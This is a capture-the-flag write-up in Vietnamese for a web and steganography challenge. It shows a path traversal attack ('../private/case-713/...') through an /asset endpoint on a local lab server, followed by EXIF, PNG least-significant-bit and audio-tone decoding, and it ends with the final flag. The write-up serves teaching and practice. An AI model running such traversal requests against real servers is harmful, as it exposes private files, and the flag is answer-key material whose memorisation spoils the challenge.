
# Tri-Modal Stego Web - Writeup

## 1. Khảo sát trang chính

Trang chính là một portal forensics nội bộ. File public duy nhất được hiển thị là:

```text
/asset?name=cover.png
```

Tải file này về không thấy flag trong metadata, strings hay pixel rõ ràng.

## 2. Kiểm tra robots.txt

```bash
curl http://127.0.0.1:8083/robots.txt
```

Kết quả:

```text
User-agent: *
Disallow: /api/
```

Điều này gợi ý có API nội bộ không được index.

## 3. Mở API index

```bash
curl http://127.0.0.1:8083/api/
```

Response:

```json
{
  "service": "case media api",
  "version": "legacy-migration",
  "routes": [
    "/api/status",
    "/api/manifest?case=public-demo"
  ],
  "migration_note": "old incident case 713 was archived after media review"
}
```

Có hai thông tin quan trọng: route manifest và case cũ `713`.

## 4. Kiểm tra API status

```bash
curl http://127.0.0.1:8083/api/status
```

Status xác nhận hệ thống còn biết case archive:

```json
"archived_cases": ["713"]
```

## 5. Thử manifest public

```bash
curl "http://127.0.0.1:8083/api/manifest?case=public-demo"
```

Manifest public cho biết cách loader lấy asset:

```json
"legacy_fetch": "/asset?name=<relative-file>"
```

Điều này gợi ý endpoint `/asset` nhận đường dẫn tương đối.

## 6. Lấy manifest case 713

```bash
curl "http://127.0.0.1:8083/api/manifest?case=713"
```

Response tiết lộ thư mục private và danh sách evidence:

```json
"archived_case_dir": "../private/case-713/"
"evidence": ["photo.jpg", "mask.png", "signal.wav"]
```

## 7. Khai thác path traversal/LFI

Endpoint `/asset?name=...` không kiểm tra containment path. Có thể đọc file ngoài `public_assets` bằng `../`.

Tải ba evidence:

```bash
curl -o photo.jpg "http://127.0.0.1:8083/asset?name=../private/case-713/photo.jpg"
curl -o mask.png "http://127.0.0.1:8083/asset?name=../private/case-713/mask.png"
curl -o signal.wav "http://127.0.0.1:8083/asset?name=../private/case-713/signal.wav"
```

## 8. Kiểm tra loại file

```bash
file photo.jpg mask.png signal.wav
```

Kết quả mong đợi:

```text
photo.jpg: JPEG image data
mask.png: PNG image data
signal.wav: RIFF WAVE audio
```

Như vậy mỗi file là một kênh phân tích khác nhau.

## 9. Lấy phần 1 từ EXIF

Kiểm tra metadata JPEG:

```bash
exiftool photo.jpg
```

Trường `UserComment` chứa:

```text
blockChainPTIT{tri_
```

Đây là phần đầu của flag.

## 10. Chuẩn bị phân tích LSB ảnh PNG

File `mask.png` là RGB PNG. Phần ẩn nằm ở bit thấp nhất của kênh blue.

Quy tắc đọc:

```text
đọc pixel từ trái sang phải, trên xuống dưới
blue & 1 -> bit
8 bit -> 1 ký tự ASCII
NUL byte -> kết thúc
```

## 11. Decode LSB để lấy phần 2

Script tối giản:

```python
import struct, zlib

data = open("mask.png", "rb").read()
off = 8
width = height = None
raw = b""

while off + 12 <= len(data):
    size = int.from_bytes(data[off:off + 4], "big")
    kind = data[off + 4:off + 8]
    payload = data[off + 8:off + 8 + size]
    if kind == b"IHDR":
        width, height = struct.unpack(">II", payload[:8])
    if kind == b"IDAT":
        raw += payload
    off += 12 + size

pixels = zlib.decompress(raw)
bits = []
pos = 0
for _ in range(height):
    pos += 1
    row = pixels[pos:pos + width * 3]
    pos += width * 3
    for x in range(width):
        bits.append(str(row[x * 3 + 2] & 1))

out = bytearray()
for i in range(0, len(bits), 8):
    b = int("".join(bits[i:i + 8]), 2)
    if b == 0:
        break
    out.append(b)
print(out.decode())
```

Kết quả:

```text
modal_stego_
```

## 12. Phân tích audio spectrogram

Mở `signal.wav` bằng Audacity hoặc Sonic Visualizer, chuyển sang chế độ spectrogram.
<img width="1191" height="182" alt="Screenshot 2026-06-02 171102" src="https://github.com/user-attachments/assets/37a3a643-07bb-4a4f-a765-f7bcb0cba377" />

Sẽ thấy tín hiệu theo từng cửa sổ thời gian, chỉ xuất hiện một trong hai dải tần:

```text
1200 Hz -> bit 0
2400 Hz -> bit 1
```

Mỗi bit dài khoảng:

```text
0.20 giây
```

Trong mỗi cửa sổ sẽ có một đoạn tone ngắn rồi một khoảng lặng nhỏ, nên khi zoom ngang sẽ thấy từng cột/từng đoạn tách rõ hơn.

## 13. Decode audio để lấy phần 3

Nếu 2400 Hz mạnh hơn thì bit là `1`, ngược lại là `0`. Ghép mỗi 8 bit thành ASCII, dừng ở NUL byte.

Kết quả:

```text
web}
```

## 14. Ghép flag

Ba phần thu được:

```text
blockChainPTIT{tri_
modal_stego_
web}
```

Flag cuối:

```text
blockChainPTIT{tri_modal_stego_web}
```
